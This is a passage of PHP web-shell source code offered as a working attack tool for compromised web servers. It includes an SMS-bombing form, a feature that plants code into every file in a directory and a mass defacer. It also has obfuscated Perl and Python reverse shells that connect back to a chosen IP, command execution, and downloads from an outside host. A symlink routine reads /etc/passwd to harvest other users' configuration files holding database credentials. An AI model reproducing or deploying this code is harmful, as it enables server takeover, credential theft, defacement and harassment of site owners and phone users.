<option value='@cellularone.textmsg.com'>Cellular One2</option>
<option value='@message.cellone-sf.com'>Cellular One3</option>
<option value='@mobile.celloneusa.com'>Cellular One4</option>
<option value='@sbcemail.com'>Cellular One5</option>
<option value='@phone.cellone.net'>Cellular One (East Coast)</option>
<option value='@swmsg.com'>Cellular One (South West)</option>
<option value='@mycellone.com'>Cellular One (West)</option>
<option value='@paging.cellone-sf.com'>Cellular One PCS</option>
<option value='@csouth1.com'>Cellular South</option>
<option value='@cwemail.com'>Centennial Wireless</option>
<option value='@cvcpaging.com'>Central Vermont</option>
<option value='@messaging.centurytel.net'>CenturyTel</option>
<option value='@rpgmail.net'>Chennai RPG Cellular</option>
<option value='@airtelchennai.com'>Chennai Skycell / Airtel</option>
<option value='@gocbw.com'>Cincinnati Bell</option>
<option value='@cingularme.com'>Cingular</option>
<option value='@mms.cingularme.com'>Cingular2</option>
<option value='@mycingular.com'>Cingular3</option>
<option value='@page.cingular.com'>Cingular5</option>
<option value='@txt.att.net'>Cingular (Now AT&T)</option>
<option value='@clarotorpedo.com.br'>Claro (Brasil)</option>
<option value='@ideasclaro-ca.com'>Claro (Nicaragua)</option>
<option value='@msg.clearnet.com'>Clearnet</option>
<option value='@comcastpcs.textmsg.com'>Comcast</option>
<option value='@comcel.com.co'>Comcel</option>
<option value='@sms.comviq.se'>Comviq</option>
<option value='@cookmail.com'>Cook Paging</option>
<option value='@corrwireless.net'>Corr Wireless Communications</option>
<option value='@sms.mycricket.com'>Cricket</option>
<option value='@sms.ctimovil.com.ar'>CTI</option>
<option value='@airtelmail.com'>Delhi Aritel</option>
<option value='@delhi.hutch.co.in'>Delhi Hutch</option>
<option value='@page.hit.net'>Digi-Page / Page Kansas</option>
<option value='@mobile.dobson.net'>Dobson</option>
<option value='@sms.orange.nl'>Dutchtone / Orange-NL</option>
<option value='@sms.edgewireless.com'>Edge Wireless</option>
<option value='@sms.emt.ee'>EMT</option>
<option value='@emtelworld.net'>Emtel (Mauritius)</option>
<option value='@escotelmobile.com'>Escotel</option>
<option value='@fido.ca'>Fido</option>
<option value='@epage.gabrielwireless.com'>Gabriel Wireless</option>
<option value='@sendabeep.net'>Galaxy Corporation</option>
<option value='@webpager.us'>GCS Paging</option>
<option value='@msg.gci.net'>General Communications Inc.</option>
<option value='@t-mobile-sms.de'>German T-Mobile</option>
<option value='@msg.globalstarusa.com'>Globalstar (satellite)</option>
<option value='@bplmobile.com'>Goa BPLMobil</option>
<option value='@sms.goldentele.com'>Golden Telecom</option>
<option value='@epage.porta-phone.com'>GrayLink / Porta-Phone</option>
<option value='@celforce.com'>Gujarat Celforce</option>
<option value='@messaging.sprintpcs.com'>Helio</option>
<option value='@text.houstoncellular.net'>Houston Cellular</option>
<option value='@ideacellular.net'>Idea Cellular</option>
<option value='@ivctext.com'>Illinois Valley Cellular</option>
<option value='@page.infopagesystems.com'>Infopage Systems</option>
<option value='@inlandlink.com'>Inland Cellular Telephone</option>
<option value='@msg.iridium.com'>Iridium (satellite)</option>
<option value='@rek2.com.mx'>Iusacell</option>
<option value='@jsmtel.com'>JSM Tele-Page</option>
<option value='@msg.koodomobile.com'>Koodo Mobile (Canada)</option>
<option value='@mci.com'>MCI Phone</option>
<option value='@sms.mymeteor.ie'>Meteor</option>
<option value='@metropcs.sms.us'>Metro PCS</option>
<option value='@clearlydigital.com'>Midwest Wireless</option>
<option value='@mobilecomm.net'>Mobilcomm</option>
<option value='@text.mtsmobility.com'>MTS</option>
<option value='@sms.netcom.no'>Netcom</option>
<option value='@messaging.nextel.com'>Nextel</option>
<option value='@o2.co.uk'>O2</option>
<option value='@o2imail.co.uk'>O2#2</option>
<option value='@mmail.co.uk'>O2 (M-mail)</option>
<option value='@orange.net'>Orange</option>
<option value='@qwestmp.com'>Qwest</option>
<option value='@pcs.rogers.com'>Rogers</option>
<option value='@sms.sasktel.com'>Sasktel (Canada)</option>
<option value='@mysmart.mymobile.ph'>Smart Telecom</option>
<option value='@messaging.sprintpcs.com'>Sprint</option>
<option value='@tms.suncom.com'>Sumcom</option>
<option value='@tmomail.net'>T-Mobile</option>
<option value='@t-mobile.uk.net'>T-Mobile (UK)</option>
<option value='@t-d1-sms.de'>T-Mobile Germany</option>
<option value='@txt.att.net'>Tracfone</option>
<option value='@mmst5.tracfone.com'>Tracfone (prepaid)</option>
<option value='@vtext.com'>Verizon</option>
<option value='@vmobl.com'>Virgin Mobile</option>
<option value='@vmobile.ca'>Virgin Mobile (Canada)</option>
<option value='@vodafone.net'>Vodafone UK</option>
</select>
</td>
</tr>
<tr>
<td>Amount Of Messages To Send:</td> 
<td><input type='text' name='numberof' size='10' class='text'></td>
</tr>
<tr>
<td>From:</td> 
<td><input type='text' name='from' class='text'></td>
</tr>
<tr>
<td>Subject:</td>
<td><input type='text' size='85' class='text' name='subject'></td>
</tr>
</table>
Message Content:<br>
<textarea rows='20' cols='150' name='message_content' style='color:#00ff00'>
</textarea><br>
<input type='submit' name='do_bomb_sms' value='Bomb'><br>
</form><br></font><br>";
}
?>
<?php
//Install MySQL Tool
if (isset($_GET['installMySQL'])) {
    echo "<center>
<font size='4'>
<a href='?msd1' class='navbar'>Install MySQL Dumper v2.0 By: Plum</a>
<br>
<br>
<a href='?msd2' class='navbar'>Install MySQL Dumper v1.24.4 (Original MSD)</a>
</font>
</center>
<br>";
}
//MSD 1 stuff
if (isset($_GET['msd1'])) {
    echo "<center>
<font color='#14ab00' size='3'>
Directory to install to:<br>
If directory does not exist it will attempt to create it.
<form action='' method='post'>
<input type='text' name='msd1dir' class='text' size='50' value='$dir/msd'>
<input type='submit' name='installmsd1' value='Install'>
<form>
</font>
</center>
<br>";
}
if (isset($_POST['installmsd1'])) {
    $msd1dir = rtrim($_POST['msd1dir'], "/");
    $msd1dir2 = "$msd1dir/msdv2.zip";
    if (!is_dir($msd1dir)) {
        if (!mkdir($msd1dir, 0777)) {
            error("Failed to make directory $msd1dir");
        }
    }
    $link = file_get_contents("http://p0wersurge.com/msdv2.zip");
    if (file_put_contents($msd1dir2, $link)) {
        unzip($msd1dir2, $msd1dir);
    } else {
        error("Could not write to $msd1dir");
    }
}
//MSD 2 stuff
if (isset($_GET['msd2'])) {
    echo "<center>
<font color='#14ab00' size='3'>
Directory to install to:<br>
If directory does not exist it will attempt to create it.
<form action='' method='post'>
<input type='text' name='msd2dir' class='text' size='50' value='$dir/msd'>
<input type='submit' name='installmsd2' value='Install'>
<form>
</font>
</center>
<br>";
}
if (isset($_POST['installmsd2'])) {
    $msd2dir = rtrim($_POST['msd2dir'], "/");
    $msd2dir2 = "$msd2dir/msd.zip";
    if (!is_dir($msd2dir)) {
        if (!mkdir($msd2dir, 0777)) {
            error("Failed to make directory $msd2dir");
        }
    }
    $link = file_get_contents("http://p0wersurge.com/msd.zip");
    if (file_put_contents($msd2dir2, $link)) {
        unzip($msd2dir2, $msd2dir);
    } else {
        error("Could not write to $msd2dir");
    }
}
?>
<?php
//Mass file infect
if (isset($_POST['do_mass_infect'])) {
    $masscode = " " . $_POST['massinfect_code'] . "\n";
    $inf_dir = $_POST['infect_dir'];
    $infcustom_dir = $_POST['cinfect_dir'];
    $infcustom_dir = rtrim($infcustom_dir, "/");
    $failed = 0;
    $success = 0;
    if (empty($masscode)) {
        error("You must enter a code to infect files with!");
    } elseif (empty($infcustom_dir) && $inf_dir == "custom") {
        error("You must enter a custom directory when using the Custom option!");
    } else {
        if ($inf_dir == "root") {
            $mddir = $rootdir;
        }
        if ($inf_dir == "custom") {
            $mddir = $infcustom_dir;
        }
        foreach (files($mddir) as $key => $file) {
            $file2 = trim($file, ".");
            $getinf_file = file_get_contents($file2);
            if ("$file2" == "$dir/$script2") {
                echo "";
            } else {
                if (file_put_contents("$file2", $masscode) && file_put_contents("$file2", $getinf_file, FILE_APPEND)) {
                    echo "<font color='green'><b>Successfully infected file: $file2</b></font><br>";
                    $success++;
                } else {
                    echo "<font color='red'><b>Failed to infect file: $file2</b></font><br>";
                    $failed++;
                }
            }
        }
        echo "<font color='#14ab00'><b>$success files successfully infected! ^_^<br>Failed to infect $failed files! :( </b></font><br>";
    }
}
if (isset($_GET['massinfect'])) {
    $example = "<?php system() ?>";
    $example = htmlspecialchars($example);
    $example2 = "<script>alert()</script>";
    $example2 = htmlspecialchars($example2);
    echo "<center>
<font color='#14ab00'>
<form action='' method='post'>
Directory to start infect from:<br>
<select name='infect_dir'>
<option value='root'>Root</option>
<option value='custom'>Custom</option>
</select><br>
Custom Directory: <input class='text' type='text' name='cinfect_dir' size='40'><br>
This is great for infecting mass files with javascript scripts or php scripts<br>
It will append the code to the top of each file.<br>
Example:<br>
$example<br>
$example2<br>
Infect code:<br>
<textarea rows='20' cols='150' name='massinfect_code' style='color:#000'>
</textarea><br>
This will not infect this shell.<br>
<input type='submit' name='do_mass_infect' value='Infect'><br>
</form>
</font>
</center>";
}
?>
<?php
//Mass Defacer
if (isset($_POST['do_mass_deface'])) {
    if (get_magic_quotes_gpc()) {
        $mass_source = stripslashes($_POST['massdeface_source']);
    } else {
        $mass_source = $_POST['massdeface_source'];
    }
    $def_dir = $_POST['deface_dir'];
    $custom_dir = $_POST['custom_dir'];
    $custom_dir = rtrim($custom_dir, "/");
    $failed = 0;
    $success = 0;
    if (empty($mass_source)) {
        error("You must enter a source!");
    } elseif (empty($custom_dir) && $def_dir == "custom") {
        error("You must enter a custom directory when using the Custom option!");
    } else {
        if ($def_dir == "root") {
            $mddir = $rootdir;
        }
        if ($def_dir == "custom") {
            $mddir = $custom_dir;
        }
        foreach (files($mddir) as $key => $file) {
            $file2 = trim($file, ".");
            if ("$file2" == "$dir/$script2") {
                echo "";
            } else {
                if (file_put_contents("$file2", $mass_source)) {
                    echo "<font color='green'><b>Successfully defaced file: $file2</b></font><br>";
                    $success++;
                } else {
                    echo "<font color='red'><b>Failed to deface file: $file2</b></font><br>";
                    $failed++;
                }
            }
        }
        echo "<font color='#14ab00'><b>$success files successfully defaced!<br>Failed to deface $failed files!</b></font><br>";
    }
}
if (isset($_GET['massdeface'])) {
    echo "<center>
<font color='#14ab00'>
<form action='' method='post'>
Directory to start deface from:<br>
<select name='deface_dir'>
<option value='root'>Root</option>
<option value='custom'>Custom</option>
</select><br>
Custom Directory: <input class='text' type='text' name='custom_dir' size=security'40'><br>
Source of deface:<br>
<textarea rows='20' cols='150' name='massdeface_source' style='color:#000'>
</textarea><br>
This will not deface this shell.<br>
<input type='submit' name='do_mass_deface' value='Deface'><br>
</form>
</font>
</center>";
}
?>
<?php 
if(isset($_GET['perlbackconnect']))
{ ?>
<font size=2 face="comic sans ms" color=white>
<p><form method=POST action="">
Client ip:<input type=text name=ip value=<?php echo $_SERVER['REMOTE_ADDR'];?>>
Connection Port:<input type=text name=port /><p>
<input type=submit name=sbm value="Connect" /></form>
</font>
<?php 


if(isset($_POST['sbm']))
{
	$r=$_POST["ip"];
	$s=$_POST["port"];
	$p1 ='hVNhb5swEP0eKf/hSqsFpNCE9sOkRFTLUtKibU0FJJrEUGTgWlCJHWGzJZr234dNqBKlVY0E9rtnv3e+4/xsUPFyEOd0sMGy6Ha6nYojuPPRyGfJC4qxhC74jgtcgw09RY0Jz3pNZOLdTe0v9Xup1psypwI0ME3bDsOvJHmZMkoxEeBnWBRRZNumCb/onhCzLbA/FFOIdxAgWYNL05wfUWsyaOrw/Al0JXhmXxnwV0KwF1xw8owjuBhCeM+4iCB8ZGX9kdubzZDmCJqzVSTr6vPlsH4ssK6ta2g5/9r8D3KXy1le4D2haYEK4iqq+/PpNyfow+Ns5T7IiQRWfuA5kx99eEaxKZlg8Y6SNeo9kWx6hgGsVEb2tkMzggUlcYEgGHjIWfEbQWbQWkqa63sVk9okTctVTtVdLEMr6kNOUayIYC02jIwPtNqyHGo1VZazRs28IZVgT0XFM91QDLZBqvvBrfvQB+3mU0PTjmPzRdB/L+Z43kms9Sfr/Nb4qJUOvetaRTnWWbl+MHO/O2No1v5k6UgMxphkrAbrkoBJYPw6VQF10t5W28nv+ak7d37Suf5J5761N61SvFSjQMEhwy2ILOfAs1zAz1s4POAou/1/2Bg8d+azbuc/';
	
   $dec= gzinflate(base64_decode($p1));
   $fname = fopen('backconn.pl','w');
     fwrite($fname,$dec); 
      $d="backconn.pl";
     $ch="chmod +x ".$d ;
            $permission= system($ch);
           
            $z="perl ".$d." ".$r." ".$s;
            $run= system($z);
   
 }  

}
?>
<?php
if(isset($_GET['pythonbackconnect']))
{
	?>
<form method=POST>
Client ip:<input type=text name=pyt value=<?php echo $_SERVER['REMOTE_ADDR'];?>>
port:<input type=text name=port /><p>
<input type=submit name=pyb value="Connect" /></form>
</font>
<?php
}
?>
<?php
if(isset($_POST['pyb']))
{
	$r=$_POST["pyt"];
	$s=$_POST["port"];
	$py = 'fVLfS8MwEH4X/B9u9WEptJ1O8UEouI0JIjpwe+vK6I/bGpYmJUnV+tebrF2dIEsgucv33eXj7q4Go1rJUUr5qGp0IfjlRbtpWQmpQTXKAyWyPWoPhLXrtJIiQ6WOzEIoDaFlBoncfUQ3sX09RIdAuSY9Mo7dY1CbMlCoc9wmNdOalihqTe6ve45BIM2I+2AdAC2bzgKjaG+/7JIcLtJ5k6fN89t85XXucjF72SxX7/PJq3sSHWSCc8w0IVa+Z9W6f3CFPCfD4fD41q4cP5CJCiWILeiCKlCZpJUGY6V3TCffiXzclQll5oMS1vxv+Ony/TCMoqn4gsUnxxymDawwKeGZ53RZIGNxHIa+b3KsudHRixMqyOtqTKzILWXIBXG96/PwzXl4fB6+/S2M1WUL3w9BkCWMkcg5TJAqHM/xqRN3AfiVoalN14muw30PK2mGA5xoEMOsbQYVHCwrB8Nz/suBUgrpAf6XZG4x+CyMbOi6S/nOMeyWbE87Tj8=';
	
   $dec= gzinflate(base64_decode($py));
   $fname = fopen('backconn.py','w');
     fwrite($fname,$dec); 
      $d="backconn.py";
     $ch="chmod +x ".$d ;
            $permission= system($ch);
           
            $z="python ".$d." ".$r." ".$s;
            $run= system($z);
   
 }     
?>
<?php
//echo out files
echo "<table border='1' width='100%' frame='void'>
<tr>
<th>
Current Directory: ";
$ex = explode("/", $dir);
for ($p = 0;$p < count($ex);$p++) {
    @$linkpath.= $ex[$p] . '/';
    $linkpath2 = rtrim($linkpath, "/");
    echo "<a href=http://$domain$script?path=$linkpath2>$ex[$p]</a>/";
}
echo "</th>
</tr>
</table>
<div id='hover'>
<table border='1' width='100%'>
<form action='' method='post' id='checkboxall'>
<tr>
<th>Directory/File Name</th>
<th>Owner/Group</th>
<th>Permissions</th>
<th>Writeable</th>
<th>Size</th>
<th>Last Modified</th>
<th>Delete</th>
<th>Rename</th>
<th>Mass</th>
</tr>
";
foreach ($direcs as $d) {
    $downer = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner("$dir/$d")) : fileowner("$dir/$d");
    $dgroup = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup("$dir/$d")) : filegroup("$dir/$d");
    if (is_array($downer)) {
        $downer = $downer['name'];
    }
    if (is_array($dgroup)) {
        $dgroup = $dgroup['name'];
    }
    $dperms = substr(base_convert(fileperms("$dir/$d"), 10, 8), 2);
    $dwrite = is_writeable("$dir/$d") ? "<font color='#00ff00'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
    $dsize = "Directory";
    $dtime = date("F d Y g:i:s", filemtime("$dir/$d"));
    echo "<tr>
<td><a href='http://$domain$script?path=$dir/$d'>$d</a></td>
<td style='text-align: center;'>$downer/$dgroup</td>
<td style='text-align: center;'>$dperms</td>
<td style='text-align: center;'>$dwrite</td>
<td style='text-align: center;'>$dsize</td>
<td style='text-align: center;'>$dtime</td>
<td style='text-align: center;'><a href='http://$domain$script?deldir=$dir/$d'>Delete</a></td>
<td style='text-align: center;'><a href='http://$domain$script?rendir=$dir&old=$d'>Rename</a></td>
<td style='text-align: center;'><input name='delbox[]' type='checkbox' id='delbox' value='$dir/$d'></td>
</tr>";
}
foreach ($files as $f) {
    $fowner = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner("$dir/$f")) : fileowner("$dir/$f");
    $fgroup = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup("$dir/$f")) : filegroup("$dir/$f");
    if (is_array($fowner)) {
        $fowner = $fowner['name'];
    }
    if (is_array($fgroup)) {
        $fgroup = $fgroup['name'];
    }
    $fperms = substr(base_convert(fileperms("$dir/$f"), 10, 8), 2);
    $fwrite = is_writeable("$dir/$f") ? "<font color='#00ff00'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
    $fsize = ByteConversion(filesize("$dir/$f"));
    $ftime = date("F d Y g:i:s", filemtime("$dir/$f"));
    $zip_file = explode(".", $f);
    $zip_file2 = end($zip_file);
    echo "<tr>";
    if ($zip_file2 == "zip") {
        echo "<td><a href='http://$domain$script?unzipfile=$dir/$f'>$f</td>";
    } else {
        echo "<td><a href='http://$domain$script?editfile=$dir/$f'>$f</td>";
    }
    echo "<td style='text-align: center;'>$fowner/$fgroup</td>
<td style='text-align: center;'>$fperms</td>
<td style='text-align: center;'>$fwrite</td>
<td style='text-align: center;'>$fsize</td>
<td style='text-align: center;'>$ftime</td>
<td style='text-align: center;'><a href='http://$domain$script?delfile=$dir/$f'>Delete</a></td>
<td style='text-align: center;'><a href='http://$domain$script?renfile=$dir&old=$f'>Rename</a></td>
<td style='text-align: center;'><input name='delbox[]' type='checkbox' id='delbox' value='$dir/$f'></td>
</tr>";
}
echo "</table></div>";
echo "<div id='bottom'><font color='#14ab00'>With all selected:</font><br>
<input type='button' onclick='checkall();' value='Select/Unselect All'>
<select name='mass_action'>
<option value='Delete'>Delete</option>
<option value='chmod'>chmod</option>
</select>
<input type='text' name='chmod_value' class='text' value='chmod value' size='9' id='ch' onfocus='removeValue()'>
<input type='submit' name='mass_files'><br></div>";
echo "</form>";
closedir();
?>
<script type="text/javascript">/*<![CDATA[*/function removeValue(){document.getElementById("ch").value=""}checked=false;function checkall(a){var c=document.getElementById("checkboxall");if(checked==false){checked=true}else{checked=false}for(var b=0;b<c.elements.length;b++){c.elements[b].checked=checked}};/*]]>*/</script>
<?php
$wr = is_writeable($dir) ? "<font color='#00ff00'><b>[ Writeable ]</b></font>" : "<font color='red'><b>[ Non Writeable ]</b></font>";
echo "<table border='1' width='100%' frame='void'>
<tr>
<td>
<center>
Create directory:<br>
<form action='' method='post'>
<input type='text' class='textround' name='create_dir' value='$dir/newdir' size='50'>
<input type='submit' name='do_create_dir' value='Create'><br>
$wr
</form>
</center>
</td>
<td>
<center>
Create file:<br>
<form action='' method='post'>
<input type='text' class='textround' name='create_file' value='$dir/newfile.php' size='50'>
<input type='submit' name='do_create_file' value='Create'><br>
$wr
</form>
</center>
</td>
</tr>
<tr>
<td>
<center>
Go to directory:<br>
<form action='' method='post'>
<input type='text'class='textround' name='go_dir' value='/tmp' size='50'>
<input type='submit' name='do_go_dir' value='Go'><br>
</form>
</center>
</td>
<td>
<center>
Edit file:<br>
<form action='' method='post'>
<input type='text' class='textround' name='go_edit_file' value='$dir/index.php' size='50'>
<input type='submit' name='do_go_edit' value='Edit'><br>
</form>
</center>
</td>
</tr>
<tr>
<td>
<center>
<form action='' method='post' enctype='multipart/form-data'>
Upload to location:<br>
<input type='text' class='text' style='width: 300px' value='$dir/' name='upload_location'></br><input type='file' name='upload_file'>
<input type='submit' value='Upload' name='do_upload_file'><br>
$wr
</form>
</center>
</td>
<td>
<center>
<form action='' method='post'>
wget file:<br>
<input type='text' name='wget_file' class='text' size='50' value='http://'>
<input type='submit' name='do_wget_file' value='wget'>
</form>
</center>
</td>
</tr>
<table border='1' frame='void' width='100%'>
<tr>
<td>
<center>
<form action='' method='post'>
Execute Command:<br>
<input type='text' class='text' name='exe_command' size='60'>
<input type='submit' name='do_exe_command' value='Execute'><br>
</form>
</center>
</td>
</tr>
</table>
<br><br><br>";
?>
<?php
//Salt generator
function gen_salt($length) {
    $characters = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $i = 0;
    $salt = "";
    while ($i < $length) {
        $arrand = array_rand($characters, 1);
        $salt.= $characters[$arrand];
        $i++;
    }
    return $salt;
}
?>
<h2><p>Symlink Killer ++</p></h2>
<form method=post><font color=white size=2 face="comic sans ms">Click this button to generate PHP.ini</font><p>
<input type=submit name=ini value="Generate PHP.ini" /></form>
<form method=post><font color=white size=2 face="comic sans ms">Click this button to extract usernames for Symlink</font><p>
<input type=submit name="usre" value="Extract usernames" /></form>
<?php
	if(isset($_POST['ini']))
	{
		
		$r=fopen('php.ini','w');
		$rr=" disbale_functions=none ";
		fwrite($r,$rr);
		$link="<a href=php.ini><font color=red size=2 face=\"comic sans ms\"><u>open this link in new tab to run PHP.INI</u></font></a>";
		echo $link;
		
		}
	
	
	
	?>
<?php
	error_reporting(0);
	echo "<font color=red size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	mkdir('security',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('security/.htaccess','w');
fwrite($g,$rr);
$security = symlink("/","security/root");
		    $rt="<a href=security/root><font color=white size=3 face=\"comic sans ms\"> Success </font></a>";
        echo "Check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir('SECURITY',0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $f = fopen('SECURITY/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=SECURITY/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       		$usr=explode("\n",$_POST['user']);
       	$configuration=array("wp-config.php","wordpress/wp-config.php","web/wp-config.php","wp/wp-config.php","press/wp-config.php","wordpress/beta/wp-config.php","news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","blog/wp-config.php","protal/wp-config.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","joomla/configuration.php","protal/configuration.php","joo/configuration.php","cms/configuration.php","site/configuration.php","main/configuration.php","news/configuration.php","new/configuration.php","home/configuration.php","configuration.php","SSI.php","forum/SSI.php","forum/inc/config.php","forum/includes/config.php","upload/includes/config.php","cc/includes/config.php","vb/includes/config.php","vb3/includes/config.php","cpanel/configuration.php","panel/configuration.php","ubmitticket.php","manage/configuration.php","myshop/configuration.php","beta/configuration.php","includes/config.php","lib/config.php","conf_global.php","inc/config.php","icl/config.php","include/db.php","include/config.php","includes/functions.php","includes/dist-configure.php","connect.php","mk_conf.php","config/koneksi.php","system/sistem.php","config.php","Settings.php","settings.php","sites/default/settings.php","smf/Settings.php","forum/Settings.php","forums/Settings.php","host/configuration.php","hosting/configuration.php","hosts/configuration.php","zencart/includes/dist-configure.php","shop/includes/dist-configure.php","whm/configuration.php","whmc/configuration.php","whmcs/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","order/configuration.php","support/configuration.php","supports/configuration.php","oscommerce/includes/configure.php","oscommerces/includes/configure.php","shopping/includes/configure.php","sale/includes/configure.php","config.inc.php","amember/config.inc.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configurtion.php","billing/configuration.php","billings/configuration.php","admin/conf.php","datas/config.php","e107_config.php","/default/settings.php","admin/config.php");
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			foreach($configuration as $c)
			{
			 $rs="/home/".$us."/public_html/".$c;
			 $r="SECURITY/".$us." .. ".$c;
			 symlink($rs,$r);
			
		}
			
			}
		
		
		}
	
	
	
	?>
<?php
	if(isset($_POST['usre'])){
		?><form method=post>
<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?>
	</textarea><br><br>
<input type=submit name=su value="Start Extract" /></form>
<?php } ?>
<form method=post>
<font color=white size=2 face="comic sans ms">Click this button to open manual symlink form</font><p>
<input type=submit name=man value="Open Manual symlink form"/></form>
<?php
	if(isset($_POST['man']))
{	
?>
<form method=post>file link that you want symlink:-<input type=text name=dli value="/home/user/public_html/config.php">&nbsp file name with which you want represent symlink :-<input type=text name=fna value="owned.txt"><br>use .txt(owned.txt) or no extension(owned) for file which will represent symlink<br><br><input type=submit name=manual value="Lets do it "></form>
<?php	
}	
	?>
<?php
	error_reporting(0);
	if(isset($_POST['manual']))
	{
	$dlink=trim($_POST['dli']);
     $fna=trim($_POST['fna']);
     mkdir('SECURITY',0777);
	$acc = " Options all \n DirectoryIndex security.html  \n Require None \n Satisfy Any";
$ha = fopen('SECURITY/.htaccess','w');
fwrite($ha,$acc);
$final="SECURITY/".$fna;
symlink($dlink,$final);
     
echo "<br>File link for Symlink ".$dlink." link >>> <a href=".$final."><font color=red size=3>is here</font></a>";
}
	?>
<form method=post>
<font color=white size=2 face="comic sans ms">Click this button for running Perl based symlink </font><p>
<input type=submit name=passx value="Eval"><p></form>
<?php
if(isset($_POST['passx']))
{
	?>
<textarea style="background:black;color:white" rows=20 cols=50 name=usernames><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode("\n",$user);
echo $str[0]."\n";
}

?></textarea>
<?php 
}



?>
<form method=post>
<font size=5 color=white> <input type=submit name=perl value="Configuration File Killer"> </font></form>
<p>
<?php
if(isset($_POST['perl']))
{
	error_reporting(0);

$da='tZp7c+I4EsD/T1W+g9bJDXAzRpDM7k147dzlsZOqvC5hLze3s5WSbQE65MdYcoCk2M9+atkQyMNGvjuSgJG6f2p16xW7d37AiYixwwIc0Zgj+1R/56FLOHZI4Pks2N6KYhZIZB2GgaSBtOUsoi0k6VTikfT5t+BbYLUzqUrnh6PLw/7Xq2MEdejq17+dnR4iy8b4dv8Q46P+Efrnl/75GWrWG6gfk0AwycJANYePLyxkjaSMWhhPJpP6ZL8exkPcv8ZTYDVBObu05Ypm3ZOe1dve6ugWpz4PRPcVTvPg4CBVT4Up8eDTp5IgkLbp94Tdd5fdPCPBMCFDaiE3LelaNLATYSGcq9dX7lnRWfqpjdwRiQWV3UQO7E8ZRjLJaU/pDtgQjRnnNO7gtFDVCjnjFIHDM5ArBFhf9x7Q4/bWQDViD4jP+KyF+mQU+qSdlQr2oILU/BhNFyUTyoYj2UJOyD1V5oY8jFtoZ1+9BgNVAHybcDYMWshVptN4UShGxAsnSpMTd4wa0VT/7Wn0fHtrxx1RdxwmEoRJTAmYtr01oc6YSdsJY4/Gdkw8lghl0Y9aTSu2RuE9jV9RDyPiMqn61Kj/1EaOanUYh0ng2anR+/qlAB2sHQSewlk8KwouEgdxxpUV1d1E0LiGuujznarY9UWsrr9PH6OJN4eCcchJF4rrFrbqWnpZ/IfA3wKMh0Cc+ZwF42oFKx9TXEkl6xUcJQ5n7h3EF7PA5YlHBXZ1NJOY1qNRVPmgafWKcmMY1eVUVmqbEkOxEdQOhSnXDf1CtJYqAfZp7NLN6Fq0bBPFzlmRNWsEvLqR6/fMuRELhpuFdSFt2Abhxd4HITMs8anv0DgD1lUD68Ss3gxaADP0bqr01GcC+8M6OBMpZeUayNC0QRgnL2bcOlGLlKC+mAavYA07TGDf17R11o9lMc+N+mgGmkT2a5RJ1Nw3BeWx1JsZ7vYqF3d7ZWydo04VBSbaIGMGLqSaI6OYCpHL1BKGDlBnhWLwUsowWBvBb8vBnywvjuBCtITXAzrJNx8EjJFFRMPBxsPh20Qbqv+Xo7fMdFAm5LhRm2joRV31NhGqTedXKEnOymenAoZHAybzrIRqwx2XqAX+bSBUmwElFTIHCNXme/fdkIeO8tUa7SczTrbHYs9Zx/zF2JyAunKd8cnQ6eO7l1vzQbnuvObnpuHZ5t9h6HOSd+pKJQyx2QwoxJaaCUq1gGwYVz/32JlZ6poexPSELeaWnLjFYPMJrHeoYnC5fWojbomFu5hrvoDfO/nn8nvHlLdfBDQ8DOfSFpXGdk5Gfp4/VXXT8N8IuBkV568EimpnYubWqj83d8wCXQuZs2+/nB/eFLG1kDHbBXgB2gW2ObnIG6aeEEkUhbHMo2Yi5twiqCGRukmcuyCIBCRKUQumRkoG/5al5wfuiW8aPzciAc2dgKmE4QZfBC3BHIUid5hBvTkR7tgVQI1v04FSbri0QJkbVTn7mOn0cnwmJXPHVL6yBhie51zO1Aqd2+VMpAy3GFuGSjcw1/Tecqb1/zF4g5V2TdDwH2fGecFcyERMT6MBGeZ6BLbJVMqQPCukzkyJ+uFAIdX8ac/yPOYxIe03btw/0MAlpnHLlDZrQT96KNXM+lOTwjb+dWjuoxsqYakVz3D+wNBSf/A2qtSt/Tdp/8V9/QKm4bqTRDwkXv6pPzEMR/LiKdlz3pMz59tbbICqu8cX/3isXB///dfjm/7d+XH/y+VRZY7od1S5urzpV2rw9DimxKve9I9OLz6gXScZDGisLrTm4eVF//iif3d2fPFL/0tlrtGIckFBMRNG3UxatXL99e6mf3168UtlnlrxOSIsFkpERJzJKn6Hl43U9MNy1bo7QrsghqqptLaquhsQnyrhe8ITWnsidIEAcqCvhVD3DyRj/B4jvFok8J+qvxF78Ff7pGEf/L5yWVPHIXdctQ6tD2hEp9XdZq2GKTx7Tlt7BlyWlSKeXF6fP2qj5